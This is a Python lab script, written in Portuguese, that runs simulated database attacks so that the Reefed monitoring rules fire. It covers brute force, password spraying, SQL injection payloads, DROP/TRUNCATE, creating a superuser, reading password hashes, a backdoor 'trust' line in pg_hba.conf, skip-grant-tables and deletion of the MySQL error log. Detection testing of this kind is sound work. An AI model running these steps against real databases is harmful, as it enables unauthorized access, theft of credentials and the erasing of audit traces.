"""Reefed lab - ataques simulados (roda a partir do IP não confiável .66).

Cada bloco imita uma técnica e aponta a(s) regra(s) do Reefed que deve disparar.
Os comandos SQL que o banco recusa (falta de permissão, tabela inexistente) são
registrados assim mesmo: o banco grava a consulta antes de executar, então a
regra enxerga o db.query e o nível sobe por ser um usuário comum (app).

Uso: attack.py [postgresql|mysql|mariadb|all]   (padrão: all)
"""

import os
import sys
import time

import common

APP_USER = {"postgresql": "app", "mysql": "app", "mariadb": "app"}
APP_PASS = "app-senha-forte"


def _exec_logado(engine, sql, user="app", password=APP_PASS, application_name=None):
    """Executa um comando que pode falhar; o importante é o banco registrar."""
    try:
        common.run(engine, sql, user=user, password=password, application_name=application_name, fetch=True)
    except Exception as exc:  # noqa: BLE001 - recusa esperada, a consulta já foi registrada
        common.log(f"    ({engine}) recusado como esperado: {type(exc).__name__}")


# ---------------------------------------------------------------------------
def forca_bruta(engine):
    common.log(f"[attack] {engine}: força bruta (6 senhas erradas, mesmo usuário) -> 110200 + bloqueio 110260")
    for i in range(6):
        common.try_login(engine, "app", f"senha-errada-{i}")
        time.sleep(0.3)


def password_spraying(engine):
    common.log(f"[attack] {engine}: password spraying (usuários diferentes) -> 110201")
    for user in ["admin", "operador", "suporte", "financeiro", "dba", "root"]:
        common.try_login(engine, user, "P@ssw0rd")
        time.sleep(0.3)


def senha_descoberta(engine):
    common.log(f"[attack] {engine}: 5 falhas e um acerto -> 110203 e sessão de IP desconhecido 110210")
    for i in range(5):
        common.try_login(engine, "app", f"errada-{i}")
        time.sleep(0.3)
    if common.try_login(engine, "app", APP_PASS):
        common.log("    login aceito depois das falhas")


def acesso_ip_desconhecido(engine):
    common.log(f"[attack] {engine}: acesso bem-sucedido de IP fora da lista -> 110210")
    _exec_logado(engine, "SELECT id FROM clientes WHERE id = 1")


def sql_injection(engine):
    common.log(f"[attack] {engine}: SQL injection -> 110300/110301/110302")
    _exec_logado(engine, "SELECT * FROM clientes WHERE nome = '' OR '1'='1'")
    _exec_logado(engine, "SELECT nome FROM clientes WHERE id = -1 "
                         "UNION SELECT table_name FROM information_schema.tables")
    _exec_logado(engine, "SELECT * FROM clientes WHERE id = 1; DROP TABLE loja_inexistente--")


def destrutivo(engine):
    common.log(f"[attack] {engine}: comandos destrutivos por usuário comum -> 110421/110422")
    _exec_logado(engine, "DROP TABLE loja_backup_inexistente")
    _exec_logado(engine, "TRUNCATE TABLE loja_backup_inexistente")


def privilegios(engine):
    common.log(f"[attack] {engine}: criação de usuário/privilégio por usuário comum -> 110520/110521")
    if engine == "postgresql":
        _exec_logado(engine, "CREATE USER invasor WITH SUPERUSER PASSWORD 'x'")
        _exec_logado(engine, "GRANT ALL PRIVILEGES ON DATABASE loja TO invasor")
    else:
        _exec_logado(engine, "CREATE USER 'invasor'@'%' IDENTIFIED BY 'x'")
        _exec_logado(engine, "GRANT ALL PRIVILEGES ON *.* TO 'invasor'@'%' WITH GRANT OPTION")


def credenciais(engine):
    common.log(f"[attack] {engine}: leitura de hashes de senha -> 110715/110716")
    if engine == "postgresql":
        _exec_logado(engine, "SELECT rolname, rolpassword FROM pg_authid")
    else:
        _exec_logado(engine, "SELECT user, authentication_string FROM mysql.user")


def exfiltracao(engine):
    common.log(f"[attack] {engine}: exfiltração (dump / leitura em massa) -> 110610/110611/110603")
    if engine == "postgresql":
        # application_name=pg_dump imita o início de um pg_dump (regra 110610/110612)
        _exec_logado(engine, "SELECT count(*) FROM pedidos", application_name="pg_dump")
    else:
        # consulta exata que o mysqldump sempre faz no começo (regra 110611)
        _exec_logado(engine, "SELECT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES "
                             "WHERE ENGINE = 'ndbcluster' AND FILE_TYPE = 'UNDO LOG'")
        # leitura em massa: 2000 linhas no slow log do MySQL (regra 110603)
        _exec_logado(engine, "SELECT * FROM pedidos")


# ---------------------------------------------------------------------------
# Ataques ao sistema de arquivos (dependem dos volumes montados no compose).

def _primeiro_existente(caminhos):
    for caminho in caminhos:
        base = os.path.dirname(caminho)
        if os.path.isdir(base):
            return caminho
    return None


def fim_postgres():
    hba = _primeiro_existente(["/pg-data/pg_hba.conf"])
    if not hba or not os.path.exists(hba):
        common.log("[attack] pg_hba.conf não montado; pulando FIM do PostgreSQL")
        return
    common.log("[attack] PostgreSQL: linha 'trust' no pg_hba.conf (backdoor de autenticação) -> 110800")
    with open(hba, "a", encoding="utf-8") as handle:
        handle.write("host    all    all    10.250.77.66/32    trust\n")


def fim_mysql_skipgrant():
    confd = "/mysql-confd"
    if not os.path.isdir(confd):
        common.log("[attack] /etc/mysql/conf.d não montado; pulando skip-grant/FIM do MySQL")
        return
    common.log("[attack] MySQL: grava skip-grant-tables no conf.d -> 110801 (FIM) + 110056 (flags)")
    with open(os.path.join(confd, "zz-reefed-attack.cnf"), "w", encoding="utf-8") as handle:
        handle.write("[mysqld]\nskip-grant-tables\n")


def apaga_log_mysql():
    log_dir = "/mysql-log"
    alvo = os.path.join(log_dir, "error.log")
    if not os.path.isdir(log_dir):
        common.log("[attack] /var/log/mysql não montado; pulando exclusão de log")
        return
    if not os.path.exists(alvo):
        common.log("[attack] error.log do MySQL já foi apagado num ataque anterior; pulando exclusão de log")
        return
    common.log("[attack] MySQL: apaga o error.log (apagar rastros) -> 110804")
    os.remove(alvo)


# ---------------------------------------------------------------------------
def ataca_banco(engine):
    common.log(f"\n===== Atacando {engine} =====")
    # Primeiro os ataques por consulta (geram os alertas individuais), e logo em
    # seguida a força bruta: assim também aparecem as regras de correlação
    # (SQL injection -> destrutivo/exfiltração) sem esconder os alertas isolados.
    acesso_ip_desconhecido(engine)
    sql_injection(engine)
    destrutivo(engine)
    privilegios(engine)
    credenciais(engine)
    exfiltracao(engine)
    forca_bruta(engine)
    time.sleep(2)
    password_spraying(engine)
    senha_descoberta(engine)


def main():
    alvo = sys.argv[1] if len(sys.argv) > 1 else "all"
    engines = ["postgresql", "mysql", "mariadb"] if alvo == "all" else [alvo]
    # Espera os bancos aceitarem conexão (o app normal já roda antes, mas garante).
    for engine in engines:
        for _ in range(30):
            if common.try_login(engine, "app", APP_PASS):
                break
            time.sleep(5)
    for engine in engines:
        ataca_banco(engine)
    # Ataques ao sistema de arquivos (só os bancos cujos volumes estão montados).
    fim_postgres()
    fim_mysql_skipgrant()
    apaga_log_mysql()
    common.log("\n[attack] pronto")


if __name__ == "__main__":
    main()
